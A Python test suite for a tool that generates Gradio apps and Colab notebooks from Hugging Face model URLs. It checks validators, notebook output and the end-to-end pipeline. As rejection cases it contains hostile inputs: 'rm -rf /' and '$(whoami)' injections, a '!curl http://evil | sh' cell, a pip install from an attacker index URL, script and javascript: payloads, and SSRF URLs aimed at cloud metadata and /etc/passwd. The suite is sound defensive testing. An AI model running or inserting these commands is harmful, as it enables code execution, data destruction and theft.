"""Phase 5-7 tests: generated-code validation, Colab notebook generation, and the full URL -> files pipeline.

Everything runs offline against the fake Hugging Face / GitHub transport in fakehub.py. No model is downloaded or run.
"""
import ast
import contextlib
import io
import json
import os
import re
import socket
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from m2g import cli, gradio_gen as gg
from m2g.colab_gen import generate_notebook, notebook_to_json
from m2g.config import Settings
from m2g.local_script import launcher_filename
from m2g.pipeline import run_pipeline, summarize
from m2g.validate import (ValidationError, combine_package_source, require_package_link, validate_app_code, validate_notebook,
                          validate_requirements_text)
from m2g import web
from fakehub import FakeWeb, hf, add_github_repo, PRESETS
from test_analyzer import analyze_preset, SUPPORTED_EXPECT

TOKEN = "hf_" + "Q" * 34


def cell_text(cell):
    return "".join(cell["source"])


def cell_index(nb, first_line=None, contains=None):
    """Index of the single cell identified by its first line or a fragment of its content (cell positions are not part of the contract)."""
    hits = [i for i, c in enumerate(nb["cells"])
            if (first_line is None or cell_text(c).split("\n", 1)[0] == first_line) and (contains is None or contains in cell_text(c))]
    assert len(hits) == 1, (first_line, contains, hits)
    return hits[0]


class TestAppValidator(unittest.TestCase):
    def test_all_generated_apps_validate(self):
        for key in SUPPORTED_EXPECT:
            code = gg.generate_app(analyze_preset(key))
            report = validate_app_code(code)
            self.assertFalse(report["trust_remote_code"], key)

    def _good(self):
        return gg.generate_app(analyze_preset("sst2"))

    def test_rejects_dangerous_variants(self):
        good = self._good()
        bad_cases = {
            "os.system": good + "\nimport os\nos.system('calc')\n",
            "exec": good + "\nexec('1')\n",
            "pickle import": "import pickle\n" + good,
            "subprocess import": "import subprocess\n" + good,
            "network import": "import socket\n" + good,
            "hardcoded share": good.replace("share=os.environ.get(\"GRADIO_SHARE\") == \"1\"", "share=True"),
            "hardcoded trust": good.replace("trust_remote_code=TRUST_REMOTE_CODE", "trust_remote_code=True"),
            "trust flag true": good.replace("TRUST_REMOTE_CODE = False", "TRUST_REMOTE_CODE = True"),
            "bad model id": good.replace("MODEL_ID = 'distilbert/distilbert-base-uncased-finetuned-sst-2-english'",
                                         "MODEL_ID = 'a b; rm -rf /'"),
            "placeholder": good + "\n# @@LEFTOVER@@\n",
            "syntax": good + "\ndef (:\n",
            "toplevel call": good + "\nprint('side effect')\n",
            "secret": good + "\n# " + TOKEN + "\n",
            "pickle weights": good.replace("USE_SAFETENSORS = True", "USE_SAFETENSORS = False"),
        }
        for name, code in bad_cases.items():
            if code == good:
                self.fail(f"test case '{name}' did not modify the code")
            with self.assertRaises(ValidationError, msg=name):
                validate_app_code(code)

    def test_package_link_between_app_and_loader_is_enforced(self):
        loader_py, app_py = gg.split_app_code(self._good())
        require_package_link(app_py, loader_py)  # the generated pair is consistent
        with self.assertRaises(ValidationError):
            require_package_link(app_py, None)  # app.py imports loader.py, which is missing
        with self.assertRaises(ValidationError):
            require_package_link("import gradio as gr\n", loader_py)  # a loader.py that app.py ignores
        require_package_link("import gradio as gr\n", None)  # a single-file app is not a package

    def test_opt_ins_are_respected(self):
        s = Settings(allow_remote_code=True)
        code = gg.generate_app(analyze_preset("remote", settings=s), s)
        self.assertTrue(validate_app_code(code, s)["trust_remote_code"])
        with self.assertRaises(ValidationError):
            validate_app_code(code, Settings())  # same code is rejected without the opt-in

    def test_requirements_validation(self):
        self.assertEqual(validate_requirements_text("gradio>=5.0\ntorch\n"), ["gradio>=5.0", "torch"])
        for bad in ["", "torch; rm -rf /", "git+https://evil/x.git", "--index-url http://x", "a b", "$(whoami)"]:
            with self.assertRaises(ValidationError, msg=bad):
                validate_requirements_text(bad)


class TestNotebook(unittest.TestCase):
    def test_all_supported_models_get_valid_notebooks(self):
        for key in SUPPORTED_EXPECT:
            a = analyze_preset(key)
            nb = generate_notebook(a)
            validate_notebook(json.loads(notebook_to_json(nb)))
            self.assertEqual(nb["nbformat"], 4)
            ids = [c["id"] for c in nb["cells"]]
            self.assertEqual(len(ids), len(set(ids)))
            sources = ["".join(c["source"]) for c in nb["cells"]]
            code_cells = [cell_text(c) for c in nb["cells"] if c["cell_type"] == "code"]
            self.assertIn("nvidia-smi", code_cells[0])  # environment/GPU check comes first
            self.assertEqual(len([s for s in sources if s.startswith("%pip install -q")]), 1)
            loader_i = cell_index(nb, first_line="%%writefile loader.py")  # the same loader.py as the local package
            app_i = cell_index(nb, first_line="%%writefile app.py")
            launch_i = cell_index(nb, contains="app.demo.launch(")
            self.assertLess(loader_i, app_i)  # app.py imports loader.py, so it is written second
            self.assertLess(app_i, launch_i)
            self.assertIn("from loader import", sources[app_i])
            self.assertIn(a.source.repo_id, sources[0])

    def test_pip_requirements_are_quoted_so_shell_does_not_redirect(self):
        nb = generate_notebook(analyze_preset("detr"))
        pip = "".join(nb["cells"][3]["source"])
        self.assertIn("'gradio>=5.0,<7'", pip)
        self.assertIn("'timm'", pip)
        self.assertNotIn(" gradio>=5.0", pip)

    def test_embedded_app_is_exactly_the_validated_app(self):
        a = analyze_preset("sst2")
        code = gg.generate_app(a)
        nb = generate_notebook(a, code)
        loader_py, app_py = gg.split_app_code(code)
        loader_cell = cell_text(nb["cells"][cell_index(nb, first_line="%%writefile loader.py")]).split("\n", 1)
        app_cell = cell_text(nb["cells"][cell_index(nb, first_line="%%writefile app.py")]).split("\n", 1)
        self.assertEqual((loader_cell[0], app_cell[0]), ("%%writefile loader.py", "%%writefile app.py"))
        self.assertEqual(loader_cell[1].rstrip("\n"), loader_py.rstrip("\n"))
        self.assertEqual(app_cell[1].rstrip("\n"), app_py.rstrip("\n"))
        self.assertIn("from loader import", app_py)

    def test_gpu_models_fail_early_and_clearly_without_gpu(self):
        nb = generate_notebook(analyze_preset("sd"))
        env = "".join(nb["cells"][1]["source"])
        self.assertIn("NEEDS_GPU = True", env)
        with self.assertRaises(RuntimeError) as cm:
            exec(compile(env, "env", "exec"), {})  # this sandbox/laptop has no CUDA
        self.assertIn("needs a GPU", str(cm.exception))

    def test_cpu_models_do_not_demand_a_gpu(self):
        env = "".join(generate_notebook(analyze_preset("sst2"))["cells"][1]["source"])
        self.assertIn("NEEDS_GPU = False", env)

    def test_unsupported_models_refuse_notebooks(self):
        # A direct Hugging Face pickle-only model is NOT listed here: it is a generatable candidate (see TestPickleOnlyWeightPolicy).
        for key in ("gguf", "gptq", "remote", "unknown"):
            with self.assertRaises(gg.GenerationError, msg=key):
                generate_notebook(analyze_preset(key))

    def test_hostile_metadata_cannot_inject_cells_or_markup(self):
        a = analyze_preset("sst2")
        evil = "x\n```\n<script>alert(1)</script>\n[click](javascript:alert(1))\n\"\"\"\nimport os; os.system('calc')"
        a.warnings = [evil]
        a.task_evidence[0].detail = evil
        nb = generate_notebook(a)
        md = "".join(nb["cells"][0]["source"])
        self.assertNotIn("<script>", md)
        self.assertNotIn("\n```", md)
        self.assertNotIn("](javascript:", md)
        validate_notebook(nb)

    def test_validator_rejects_tampered_notebooks(self):
        good = generate_notebook(analyze_preset("sst2"))

        def mutated(fn):
            nb = json.loads(json.dumps(good))
            fn(nb)
            return nb

        cases = {
            "shell escape": lambda nb: nb["cells"][3].update(source=["!curl http://evil | sh\n"]),
            "other magic": lambda nb: nb["cells"][3].update(source=["%run evil.py\n"]),
            "pip flag": lambda nb: nb["cells"][3].update(source=["%pip install --index-url http://evil 'torch'\n"]),
            "pip url": lambda nb: nb["cells"][3].update(source=["%pip install 'git+https://evil/x'\n"]),
            "outputs present": lambda nb: nb["cells"][1].update(outputs=[{"output_type": "stream"}]),
            "subprocess shell": lambda nb: nb["cells"][1].update(source=["import subprocess\nsubprocess.run('ls', shell=True)\n"]),
            "secret": lambda nb: nb["cells"][0].update(source=[TOKEN]),
            "no app cell": lambda nb: nb["cells"].pop(cell_index(nb, first_line="%%writefile app.py")),
            "no loader cell": lambda nb: nb["cells"].pop(cell_index(nb, first_line="%%writefile loader.py")),
            "two loader cells": lambda nb: nb["cells"].insert(cell_index(nb, first_line="%%writefile loader.py"),
                                                              json.loads(json.dumps(nb["cells"][cell_index(nb, first_line="%%writefile loader.py")]))),
            "bad version": lambda nb: nb.update(nbformat=3),
            "bad cell type": lambda nb: nb["cells"][0].update(cell_type="raw"),
        }
        for name, fn in cases.items():
            with self.assertRaises(ValidationError, msg=name):
                validate_notebook(mutated(fn))

    def test_credentials_never_appear_in_artifacts(self):
        s = Settings(hf_token=TOKEN, github_token="ghp_" + "Z" * 36)
        a = analyze_preset("sst2", settings=s)
        blob = notebook_to_json(generate_notebook(a, settings=s)) + gg.generate_app(a, s)
        self.assertNotIn(TOKEN, blob)
        self.assertNotIn("ghp_", blob)


class TestPipelineEndToEnd(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.out = Path(self.tmp.name) / "out"

    def settings(self, **kw):
        return Settings(output_dir=self.out, **kw)

    def run_url(self, key, **kw):
        web_ = FakeWeb()
        hf(web_, key)
        res = run_pipeline("https://huggingface.co/" + PRESETS[key]["repo_id"], self.settings(**kw), web_.fetcher())
        return res, web_

    def test_url_to_files_for_every_supported_model(self):
        for key, task in SUPPORTED_EXPECT.items():
            res, _ = self.run_url(key)
            self.assertTrue(res.ok, (key, res.error, res.notes))
            self.assertEqual(res.analysis.task, task)
            self.assertEqual(res.stage, "done")
            self.assertEqual(res.files, sorted(["analysis.json", "app.py", "colab_notebook.ipynb", "loader.py", "requirements.txt",
                                                launcher_filename(res.out_dir.name)]))
            ast.parse((res.out_dir / "app.py").read_text(encoding="utf-8"))
            ast.parse((res.out_dir / "loader.py").read_text(encoding="utf-8"))
            nb = json.loads((res.out_dir / "colab_notebook.ipynb").read_text(encoding="utf-8"))
            validate_notebook(nb)
            json.loads((res.out_dir / "analysis.json").read_text(encoding="utf-8"))
            self.assertIn(PRESETS[key]["repo_id"], summarize(res))

    def test_the_written_launcher_works_when_double_clicked(self):
        res, _ = self.run_url("sst2")
        bat = (res.out_dir / launcher_filename(res.out_dir.name)).read_bytes()
        self.assertEqual(bat.count(b"\n"), bat.count(b"\r\n"))  # CRLF only: cmd.exe can miss :labels in an LF-only file
        text = bat.decode("utf-8")
        for needed in ("%~dp0", r"%APP_DIR%\.venv", "app.py", "loader.py", "requirements.txt"):
            self.assertIn(needed, text)  # located from its own folder, with its own .venv, checking all package files
        self.assertNotIn(str(self.out), text)  # no developer-machine paths

    def test_app_py_imports_the_written_loader_py(self):
        # Asserts the generator's own contract (split_app_code), not what a particular model's UI or loader looks like.
        res, _ = self.run_url("sst2")
        app_py = (res.out_dir / "app.py").read_text(encoding="utf-8")
        loader_py = (res.out_dir / "loader.py").read_text(encoding="utf-8")
        require_package_link(app_py, loader_py)
        imported = {a.name for n in ast.walk(ast.parse(app_py)) if isinstance(n, ast.ImportFrom) and n.module == "loader" for a in n.names}
        defined = set()
        for n in ast.parse(loader_py).body:
            if isinstance(n, (ast.FunctionDef, ast.ClassDef)):
                defined.add(n.name)
            elif isinstance(n, ast.Assign):
                defined.update(t.id for t in n.targets if isinstance(t, ast.Name))
            elif isinstance(n, (ast.Import, ast.ImportFrom)):
                defined.update((a.asname or a.name).split(".")[0] for a in n.names)
        self.assertTrue(imported)
        self.assertLessEqual(imported, defined)  # everything app.py takes from loader.py really exists there
        self.assertTrue(imported & {"get_model", "get_pipe"})  # the loader entry point the Colab cell also uses
        self.assertTrue(defined & {"get_model", "get_pipe"})
        self.assertIn(gg._SETUP_MARK, loader_py)  # model setup/loading section lives in loader.py ...
        self.assertNotIn(gg._UI_MARK, loader_py)
        self.assertIn(gg._UI_MARK, app_py)  # ... and the UI/inference-callback section in app.py
        self.assertNotIn(gg._SETUP_MARK, app_py)

    def test_unsupported_model_gets_analysis_only_and_clear_reason(self):
        for key in ("gguf", "gptq", "unknown", "unsupported_task"):
            res, _ = self.run_url(key)
            self.assertIsNone(res.error, key)
            self.assertFalse(res.ok, key)
            self.assertIsNone(res.app_code)
            self.assertEqual(res.files, ["analysis.json"], key)
            self.assertTrue(res.analysis.reasons or res.analysis.generation_blocked_reasons, key)
            self.assertIn("Why it cannot be generated", summarize(res), key)
            self.assertFalse((res.out_dir / "app.py").exists(), key)

    def test_ssrf_and_bad_urls_are_rejected_before_any_network_call(self):
        web_ = FakeWeb()
        bad = ["http://127.0.0.1/a/b", "https://169.254.169.254/latest/meta-data", "file:///etc/passwd",
               "https://huggingface.co.evil.com/a/b", "https://evil.com/huggingface.co/a/b", "javascript:alert(1)",
               "https://user:pw@huggingface.co/a/b", "https://huggingface.co/../../etc/passwd", "", "not a url",
               "https://huggingface.co/a/b/../../../x"]
        for url in bad:
            res = run_pipeline(url, self.settings(), web_.fetcher())
            self.assertIsNotNone(res.error, url)
            self.assertEqual(res.stage, "parse", url)
        self.assertEqual(web_.calls, [], "no request may be made for rejected URLs")
        self.assertFalse(self.out.exists() and any(self.out.iterdir()))

    def test_network_failure_gives_clear_error_not_traceback(self):
        web_ = FakeWeb()  # nothing registered -> 404 for every route
        res = run_pipeline("https://huggingface.co/nobody/missing", self.settings(), web_.fetcher())
        self.assertIsNotNone(res.error)
        self.assertEqual(res.stage, "inspect")
        text = summarize(res)
        self.assertIn("Model inspection failed", text)
        self.assertIn("Stage: `inspect`", text)

    def test_tokens_never_written_to_disk_or_error_text(self):
        res, _ = self.run_url("sst2", hf_token=TOKEN, github_token="ghp_" + "Y" * 36)
        for p in res.out_dir.iterdir():
            text = p.read_text(encoding="utf-8")
            self.assertNotIn(TOKEN, text, p.name)
            self.assertNotIn("ghp_", text, p.name)

    def test_output_is_confined_to_output_dir_even_for_odd_names(self):
        web_ = FakeWeb()
        hf(web_, "sst2")
        res = run_pipeline("https://huggingface.co/" + PRESETS["sst2"]["repo_id"], self.settings(), web_.fetcher())
        self.assertEqual(res.out_dir.resolve().parent, self.out.resolve())

    def test_missing_generated_artifact_fails_write_stage(self):
        web_ = FakeWeb()
        hf(web_, "sst2")
        original_write = __import__("m2g.pipeline", fromlist=["_write"])._write

        def write_without_app(base, slug, files):
            out = original_write(base, slug, files)
            if "app.py" in files:  # run_pipeline also saves analysis.json early (no app.py yet); only the final write loses app.py
                (out / "app.py").unlink()
            return out

        with mock.patch("m2g.pipeline._write", side_effect=write_without_app):
            res = run_pipeline("https://huggingface.co/" + PRESETS["sst2"]["repo_id"],
                               self.settings(), web_.fetcher())

        self.assertFalse(res.ok)
        self.assertEqual(res.stage, "write")
        self.assertIn("Artifact write incomplete", res.error)
        self.assertIn("app.py", res.error)
        self.assertEqual(res.failed_step, "writing")
        self.assertEqual(res.artifacts["app.py"]["status"], "write_failed")

    def test_github_repo_is_analysed_but_never_executed_or_generated(self):
        web_ = FakeWeb()
        add_github_repo(web_, "someone/cool-ai", readme="# Cool\nSee https://huggingface.co/a/b\n",
                        requirements="torch>=2.0\ngradio\n")
        res = run_pipeline("https://github.com/someone/cool-ai", self.settings(), web_.fetcher())
        self.assertIsNone(res.error)
        self.assertFalse(res.ok)
        self.assertEqual(res.analysis.source.kind, "github")
        self.assertEqual(res.analysis.status, "partial")
        self.assertIsNone(res.app_code)
        self.assertTrue(all(c.startswith("https://") and "githubusercontent.com" in c or "github.com" in c
                            or "huggingface.co" in c for c in web_.calls))

    def test_remote_code_stays_off_by_default_and_blocks_generation(self):
        res, _ = self.run_url("remote")
        self.assertFalse(res.ok)
        res, _ = self.run_url("remote", allow_remote_code=True)
        self.assertTrue(res.ok, res.error)
        self.assertIn("TRUST_REMOTE_CODE = True", res.app_code)
        self.assertIn("ENABLED", "".join(res.notebook["cells"][0]["source"]))

    def test_unwritable_output_dir_reports_write_error(self):
        blocker = Path(self.tmp.name) / "file"
        blocker.write_text("x")
        web_ = FakeWeb()
        hf(web_, "sst2")
        res = run_pipeline("https://huggingface.co/" + PRESETS["sst2"]["repo_id"],
                           Settings(output_dir=blocker / "sub"), web_.fetcher())
        self.assertIsNotNone(res.error)
        self.assertEqual(res.stage, "write")


class TestPickleOnlyWeightPolicy(unittest.TestCase):
    """Pickle-only weights: the policy is deliberately asymmetric and neither half may be weakened by the other.

    A DIRECT Hugging Face URL yields a generatable candidate (supported_with_warnings) whose generated app and notebook keep
    pickle loading OFF until the person running it opts in. A GitHub repository that merely LINKS to such a model is refused
    (analysis only), because a GitHub repo is only trusted through a model loadable without unpickling.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.out = Path(self.tmp.name) / "out"

    def run_direct(self):
        web_ = FakeWeb()
        hf(web_, "pickle")
        return run_pipeline("https://huggingface.co/" + PRESETS["pickle"]["repo_id"], Settings(output_dir=self.out), web_.fetcher())

    def test_direct_hugging_face_pickle_only_succeeds_with_warnings(self):
        res = self.run_direct()
        self.assertIsNone(res.error)
        self.assertTrue(res.ok, (res.error, res.notes))
        self.assertEqual(res.stage, "done")
        self.assertEqual(res.analysis.status, "supported_with_warnings")
        self.assertTrue(res.analysis.generatable)
        self.assertIn("pickle", " ".join(res.analysis.warnings).lower())  # the risk is surfaced, not hidden
        for name in ("app.py", "loader.py", "requirements.txt", "colab_notebook.ipynb", "analysis.json"):
            self.assertIn(name, res.files)

    def test_generated_app_preserves_the_runtime_consent_guard(self):
        res = self.run_direct()
        self.assertTrue(res.ok, (res.error, res.notes))
        app_py = (res.out_dir / "app.py").read_text(encoding="utf-8")
        loader_py = (res.out_dir / "loader.py").read_text(encoding="utf-8")
        combined = combine_package_source(app_py, loader_py)
        validate_app_code(combined)  # still passes the full static validator
        self.assertIn("USE_SAFETENSORS = True", combined)  # generation did not opt in to pickle on the person's behalf
        self.assertNotIn("USE_SAFETENSORS = False", combined)
        self.assertNotIn("use_safetensors=False", combined)
        # NOTE: the text 'ALLOW_PICKLE_WEIGHTS = True' legitimately appears inside the user-facing PICKLE_WEIGHTS_NOTICE string (it tells
        # the person what to set in Colab), so consent is checked on the parsed code, not by substring.
        tree = ast.parse(combined)

        def bindings(name):
            hits = []
            for n in ast.walk(tree):
                targets = n.targets if isinstance(n, ast.Assign) else [n.target] if isinstance(n, (ast.AnnAssign, ast.AugAssign)) else []
                if any(isinstance(t, ast.Name) and t.id == name for t in targets):
                    hits.append(n)
            return hits

        # Consent is bound exactly once, by an expression over the explicit environment variable (never a literal True/False default).
        (consent,) = bindings("ALLOW_PICKLE_WEIGHTS")
        self.assertIsInstance(consent, ast.Assign)
        self.assertNotIsInstance(consent.value, ast.Constant)
        self.assertIn("M2G_ALLOW_PICKLE_WEIGHTS", ast.unparse(consent.value))
        # Every loader's use_safetensors value: True by default, None (safetensors first, pickle fallback) only with that consent.
        (load,) = bindings("LOAD_SAFETENSORS")
        self.assertIsInstance(load.value, ast.IfExp)
        self.assertIsInstance(load.value.test, ast.Name)
        self.assertEqual(load.value.test.id, "ALLOW_PICKLE_WEIGHTS")
        self.assertIsNone(load.value.body.value)
        self.assertIs(load.value.orelse.value, True)
        # Behaviour, not just shape: evaluate those two statements under different environments.
        module = ast.Module(body=[consent, load], type_ignores=[])
        compiled = compile(ast.fix_missing_locations(module), "consent", "exec")

        def resolve(env_value):
            with mock.patch.dict(os.environ):
                os.environ.pop("M2G_ALLOW_PICKLE_WEIGHTS", None)
                if env_value is not None:
                    os.environ["M2G_ALLOW_PICKLE_WEIGHTS"] = env_value
                ns = {"os": os}
                exec(compiled, ns)
                return ns["ALLOW_PICKLE_WEIGHTS"], ns["LOAD_SAFETENSORS"]

        for off in (None, "", "0", "false", "no", "off"):
            self.assertEqual(resolve(off), (False, True), off)  # OFF by default and for any non-affirmative value
        self.assertEqual(resolve("1"), (True, None))  # only the explicit environment variable enables it
        # Nothing in the generated code turns safetensors-only loading off by itself.
        for n in ast.walk(tree):
            if isinstance(n, ast.keyword) and n.arg == "use_safetensors":
                self.assertFalse(isinstance(n.value, ast.Constant) and n.value.value in (False, None), ast.unparse(n))
            if isinstance(n, ast.Dict):
                for k, v in zip(n.keys, n.values):
                    if isinstance(k, ast.Constant) and k.value == "use_safetensors":
                        self.assertFalse(isinstance(v, ast.Constant) and v.value in (False, None), ast.unparse(n))

    def test_generated_notebook_keeps_pickle_consent_off_by_default(self):
        res = self.run_direct()
        self.assertTrue(res.ok, (res.error, res.notes))
        nb = json.loads((res.out_dir / "colab_notebook.ipynb").read_text(encoding="utf-8"))
        validate_notebook(nb)
        i = cell_index(nb, contains="ALLOW_PICKLE_WEIGHTS = False")  # exactly one consent cell
        self.assertRegex(cell_text(nb["cells"][i]), r"(?m)^ALLOW_PICKLE_WEIGHTS = False$")
        for cell in nb["cells"]:
            if cell["cell_type"] == "code":
                self.assertIsNone(re.search(r"(?m)^ALLOW_PICKLE_WEIGHTS\s*=\s*True", cell_text(cell)))

    def test_github_linked_pickle_only_model_is_refused_with_analysis_only_output(self):
        repo_id = PRESETS["pickle"]["repo_id"]
        owner, name = repo_id.split("/")
        web_ = FakeWeb()
        hf(web_, "pickle")
        add_github_repo(web_, repo_id, readme=f"# {name}\nThe pretrained model is available at https://huggingface.co/{repo_id}\n")
        res = run_pipeline(f"https://github.com/{owner}/{name}", Settings(output_dir=self.out), web_.fetcher())
        self.assertIsNone(res.error)
        self.assertFalse(res.ok)
        self.assertIsNone(res.app_code)
        self.assertEqual(res.files, ["analysis.json"])
        self.assertFalse((res.out_dir / "app.py").exists())
        self.assertFalse((res.out_dir / "colab_notebook.ipynb").exists())
        self.assertEqual(res.analysis.status, "partial")
        reasons = " ".join(res.analysis.reasons)
        self.assertIn("never executed", reasons)
        self.assertIn("pickle", reasons)  # clear explanation: only pickle weights ...
        self.assertIn("safetensors", reasons)  # ... and no verified safetensors weights
        summary = summarize(res)
        self.assertIn("Why it cannot be generated", summary)
        self.assertIn("pickle", summary)
        self.assertIn("safetensors", summary)


class TestPlatformEntryPoints(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.settings = Settings(output_dir=Path(self.tmp.name) / "out")

    def test_web_handler_success_and_failure(self):
        web_ = FakeWeb()
        hf(web_, "sst2")
        summary, code, reqs, files = web.handle_submit(
            "https://huggingface.co/" + PRESETS["sst2"]["repo_id"], self.settings, web_.fetcher())
        self.assertIn("supported", summary)
        self.assertIn("Colab", summary)
        ast.parse(code)
        self.assertIn("gradio", reqs)
        self.assertEqual(len(files), 6)  # app, loader, requirements, launcher, notebook, analysis
        self.assertTrue(all(Path(f).is_file() for f in files))
        summary, code, reqs, files = web.handle_submit("http://localhost/x/y", self.settings, web_.fetcher())
        self.assertIn("Failed at stage", summary)
        self.assertEqual((code, reqs, files), ("", "", []))
        self.assertIn("Please paste", web.handle_submit("   ", self.settings)[0])

    def test_default_port_is_used_when_it_is_free(self):
        free = self._free_port()
        self.assertTrue(web.port_is_free("127.0.0.1", free))
        self.assertEqual(web.choose_server_port(free, "127.0.0.1"), free)

    def test_an_occupied_default_port_is_not_fatal(self):
        busy = self._occupied_port()
        self.assertFalse(web.port_is_free("127.0.0.1", busy))
        # None is Gradio's documented "scan 7860, 7861, ... for a free port" (http_server.start_server), so the launch
        # no longer dies with "OSError: Cannot find empty port in range".
        self.assertIsNone(web.choose_server_port(busy, "127.0.0.1"))
        self.assertIsNone(web.choose_server_port(0, "127.0.0.1"))

    def test_web_ui_still_starts_and_reports_the_url_when_the_default_port_is_taken(self):
        taken = self._occupied_port()
        calls = {}

        class FakeDemo:
            local_url = "http://127.0.0.1:7867/"

            def launch(self, **kwargs):
                calls.update(kwargs)

            def block_thread(self):
                calls["blocked"] = True

        with mock.patch.dict(os.environ, {"M2G_PORT": str(taken)}), \
                mock.patch.object(web, "REA_ENABLED", False), \
                mock.patch.object(web.Settings, "from_env", return_value=self.settings), \
                mock.patch.object(web, "build_ui", return_value=FakeDemo()), \
                mock.patch.object(web, "configure_logging"), \
                contextlib.redirect_stdout(io.StringIO()) as out:  # configure_logging would leak a global handler
            web.main()

        self.assertEqual(calls["server_name"], "127.0.0.1", "host behaviour must not change")
        self.assertIsNone(calls["server_port"], "Gradio must be allowed to pick the next free port")
        self.assertEqual(calls["allowed_paths"], [str(self.settings.output_dir)])
        self.assertTrue(calls["blocked"], "the UI must still block like launch() used to")
        self.assertIn(FakeDemo.local_url, out.getvalue())

    def _free_port(self) -> int:
        probe = socket.socket()
        try:
            probe.bind(("127.0.0.1", 0))
            return probe.getsockname()[1]
        finally:
            probe.close()

    def _occupied_port(self) -> int:
        busy = socket.socket()
        busy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        busy.bind(("127.0.0.1", 0))
        busy.listen(1)
        self.addCleanup(busy.close)
        return busy.getsockname()[1]

    def test_cli_exit_codes(self):
        out = str(Path(self.tmp.name) / "cli_out")
        # Rejected URL: exit 1, and no network is attempted (parse fails first). The CLI prints the failure summary; capture
        # it so the intentional rejection does not look like a failure in the test output, and check it is the https rule.
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            code = cli.main(["http://127.0.0.1/a/b", "--out", out])
        self.assertEqual(code, 1)
        self.assertIn("Stage: `parse`", buf.getvalue())
        self.assertIn("Only https:// URLs are accepted.", buf.getvalue())


if __name__ == "__main__":
    unittest.main()
